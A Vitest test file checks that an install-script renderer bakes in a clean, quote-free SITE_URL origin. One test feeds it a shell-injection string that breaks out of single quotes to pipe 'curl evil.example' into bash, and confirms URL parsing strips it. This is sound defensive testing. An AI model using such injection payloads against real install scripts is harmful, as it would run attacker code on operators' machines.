import { describe, expect, it } from "vitest";
import { resolveSiteUrl } from "../convex/githubAppConfig.ts";
import { renderInstallScript } from "../convex/installScript.ts";

// The installer bakes SITE_URL into the machine's agent config, so whatever
// lands here is what every registered runner will talk to from then on.
function siteUrlAssignments(script: string) {
  return [...script.matchAll(/^SITE_URL='([^']*)'$/gm)].map((match) => match[1]);
}

describe("renderInstallScript", () => {
  it("bakes the given origin in as the only SITE_URL", () => {
    const script = renderInstallScript("https://example.convex.site");
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
  });

  it("leaves no unsubstituted placeholder behind", () => {
    const script = renderInstallScript("https://example.convex.site");
    expect(script.includes("__RUNNER_CENTER_SITE_URL__")).toBe(false);
  });

  // The route resolves CONVEX_SITE_URL through resolveSiteUrl and passes the
  // result straight in, so these two have to compose cleanly.
  it("receives a bare origin from resolveSiteUrl, with no path or trailing slash", () => {
    const site = resolveSiteUrl("https://example.convex.site/nested/?a=1#b");
    expect(site.ok).toBe(true);

    const script = renderInstallScript(site.ok ? site.siteUrl : "");
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("example.convex.site/")).toBe(false);
  });

  // SITE_URL is interpolated into a single-quoted shell string in a script the
  // operator pipes to bash, so a value carrying a quote would be command
  // injection. A resolveSiteUrl origin cannot: URL parsing confines it to
  // scheme, host and port, and anything that could hold a quote is dropped.
  it("cannot break out of the single-quoted shell assignment", () => {
    const site = resolveSiteUrl("https://example.convex.site/';curl evil.example|bash;'");
    expect(site.ok).toBe(true);
    expect(site.ok && site.siteUrl.includes("'")).toBe(false);

    const script = renderInstallScript(site.ok ? site.siteUrl : "");
    expect(siteUrlAssignments(script)).toEqual(["https://example.convex.site"]);
    expect(script.includes("evil.example")).toBe(false);
  });
});
